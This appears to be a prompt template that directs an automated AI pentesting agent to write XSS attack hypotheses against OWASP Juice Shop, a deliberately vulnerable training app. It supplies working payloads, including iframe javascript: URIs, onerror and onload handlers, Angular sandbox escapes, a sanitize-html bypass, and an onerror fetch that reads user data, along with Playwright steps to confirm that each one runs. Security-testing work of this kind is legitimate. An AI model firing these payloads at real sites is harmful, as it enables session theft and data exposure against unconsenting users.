# Phase 1b — XSS Analysis

CRITICAL: The target is a REMOTE server at {{TARGET_URL}}.
Do NOT assume localhost. Do NOT use 127.0.0.1.
Use the provided {{TARGET_URL}} for ALL requests.

## Objective

Analyse the reconnaissance data and known vulnerabilities to produce **Cross-Site Scripting (XSS) attack hypotheses** targeting the OWASP Juice Shop at {{TARGET_URL}}. Cover **reflected XSS, stored XSS, and DOM-based XSS** vectors.

Each hypothesis must be specific, actionable, and grounded in evidence from the recon phase. Hypotheses must specify **how Playwright browser automation will be used to prove exploitation** — dialog capture, DOM inspection, or screenshot evidence.

## Input Data

### Recon Report

{{RECON_DATA}}

### Known Vulnerabilities

{{KNOWN_VULNS}}

## Analysis Instructions

1. **Identify reflection points:** Endpoints where user input is reflected back in the HTTP response body or rendered in the DOM. Focus on Angular's `bypassSecurityTrustHtml` usage which explicitly disables XSS protection.
2. **Identify stored input sinks:** Endpoints that accept user input and store it for later rendering (feedback, reviews, user profiles, product names). Pay special attention to the admin panel which renders stored data via `bypassSecurityTrustHtml`.
3. **Identify DOM sinks:** Client-side JavaScript patterns that write user-controlled data to the DOM via `innerHTML`, `document.write()`, `eval()`, or Angular template expressions. Juice Shop's search component uses `bypassSecurityTrustHtml` to render search queries.
4. **Cross-reference with known CVEs** — Angular 1.x has well-documented template injection / sandbox escape vulnerabilities. Also check `sanitize-html` CVEs.
5. **Prioritise by exploitability and Playwright provability:**
   - DOM-based XSS via search `/#/search?q=` (highest — directly provable with Playwright dialog capture)
   - Stored XSS via feedback/review submitted via API then rendered in admin panel
   - Reflected XSS via API endpoints that return unescaped HTML in JSON responses
6. **Specify proof mechanism for each hypothesis:** State exactly which Playwright capability (dialog listener, DOM locator, screenshot) will prove exploitation.

## Juice Shop XSS-Specific Context

### Primary Target: Search-Based DOM XSS (HIGHEST PRIORITY)
- **Route:** `/#/search?q=<payload>` — this is the AngularJS client-side route
- **Source code evidence:** `search-result.component.ts:171` calls `this.sanitizer.bypassSecurityTrustHtml(queryParam)` which **explicitly disables Angular's XSS protection** for the search query display
- **Proof mechanism:** Navigate via Playwright → `page.goto('{{TARGET_URL}}/#/search?q=<iframe src="javascript:alert(xss)">')` → capture `dialog` event → confirmed
- **Key insight:** Because `bypassSecurityTrustHtml` is used, standard HTML tags like `<iframe>`, `<img>`, `<svg>` with event handlers will execute — no Angular sandbox escape needed

### Secondary Target: Stored XSS via Feedback
- **Endpoint:** `POST /api/Feedbacks` with `comment` field
- **Source code evidence:** `administration.component.ts:78` renders feedback comments via `bypassSecurityTrustHtml(feedback.comment)` in the admin panel
- **Proof mechanism:** POST the payload via HTTP → navigate to admin page with Playwright → capture dialog or detect DOM element
- **CAPTCHA note:** The feedback endpoint requires a CAPTCHA. Use Playwright to solve it by reading the CAPTCHA value from the page, or use the `/api/Feedbacks` endpoint directly if the CAPTCHA can be obtained

### Tertiary Targets
- **Angular template injection:** `{{constructor.constructor('alert(1)')()}}` — may work if Angular processes the template expression before sanitization
- **sanitize-html bypass:** Version 1.4.2 has known bypasses (CVE-2016-1000237). Nested tag confusion: `<<b>script>alert(1)<</b>/script>`
- **User registration fields:** `POST /api/Users` — email, username fields may store XSS payloads that render in admin panels

## Hypothesis Format

For EACH hypothesis, use this EXACT format:

```markdown
### Hypothesis N
**Endpoint:** <METHOD> <full URL path>
**Parameter:** <parameter name or DOM sink>
**XSS Type:** <reflected / stored / DOM-based>
**Payload:** <specific XSS payload>
**Expected Result:** <what successful XSS execution would produce>
**Playwright Proof Strategy:** <exactly how Playwright will prove exploitation — dialog capture, DOM query, or screenshot>
**Evidence from recon:** <reference to specific endpoint/sink from recon_report.md>
```

## MANDATORY Hypotheses

Your output MUST include hypotheses for ALL of the following (at minimum):
1. **DOM XSS via search** — `GET /#/search?q=<iframe src="javascript:alert(xss)">` — proven by Playwright dialog capture
2. **Stored XSS via feedback** — `POST /api/Feedbacks` with `comment` containing XSS payload — proven by navigating to admin page
3. **Stored XSS via user registration** — `POST /api/Users` with email/username containing XSS — proven by API response showing unescaped payload

## Required Output

Produce a markdown document with the heading `## Hypotheses` followed by at least 5 numbered hypotheses. Example structure:

```markdown
## Hypotheses

### Hypothesis 1
**Endpoint:** GET /#/search?q=
**Parameter:** q (DOM — rendered via bypassSecurityTrustHtml)
**XSS Type:** DOM-based
**Payload:** <iframe src="javascript:alert(`xss`)">
**Expected Result:** JavaScript alert dialog fires with message "xss" when page renders
**Playwright Proof Strategy:** Register `page.on('dialog')` listener BEFORE `page.goto()`. Listener captures dialog type and message. Also take screenshot showing the injected iframe in the search results area.
**Evidence from recon:** search-result.component.ts:171 uses bypassSecurityTrustHtml to render the search query parameter directly in the DOM

### Hypothesis 2
**Endpoint:** POST /api/Feedbacks
**Parameter:** comment (JSON body)
**XSS Type:** Stored
**Payload:** <script>alert('xss-feedback')</script> embedded in feedback comment
**Expected Result:** Script executes when admin navigates to the administration page
**Playwright Proof Strategy:** POST the feedback via HTTP request. Then use Playwright to navigate to `/#/administration` with admin auth. Register dialog listener; if dialog fires, stored XSS confirmed.
**Evidence from recon:** administration.component.ts:78 renders feedback.comment via bypassSecurityTrustHtml

### Hypothesis 3
...
```

## Payload Guidelines for Juice Shop (Angular + Express + bypassSecurityTrustHtml)

### DOM XSS via search (HIGHEST PRIORITY — directly provable):
Since `bypassSecurityTrustHtml` explicitly disables Angular's built-in sanitizer, standard HTML tags work:
- `<iframe src="javascript:alert('xss')">` — triggers alert via iframe src
- `<img src=x onerror=alert('xss')>` — triggers alert via error handler
- `<svg onload=alert('xss')>` — triggers alert via SVG load event
- `<audio src=x onerror=alert('xss')>` — alternative event handler

### Angular template injection (if Angular processes expressions):
- `{{constructor.constructor('alert(1)')()}}`
- `{{$on.constructor('alert(1)')()}}`
- `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}`

### Stored XSS (feedback/reviews/user data):
- `<script>alert(document.cookie)</script>` — classic stored XSS
- `<b onmouseover=alert('xss')>hover me</b>` — event handler based
- `<img src=x onerror="fetch('/api/Users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))">` — data exfiltration

### Sanitizer bypass (sanitize-html 1.4.2):
- `<<b>script>alert(1)<</b>/script>` (nested tag confusion — CVE-2016-1000237)
- `<img src="x" onerror="alert(1)" />` (self-closing with event handler)

### Proof capture via Playwright:
Every payload should be tested with this Playwright workflow:
1. `page.on('dialog', handler)` — register BEFORE navigation
2. `page.goto(url)` — navigate to the target with the payload
3. Check if dialog handler fired → CONFIRMED
4. If no dialog: `page.locator('iframe, script, img[onerror], svg[onload]').count()` → DOM evidence
5. `page.screenshot()` — visual evidence regardless of outcome

Save the output as `hypotheses_xss.md` using the `save_deliverable` tool.
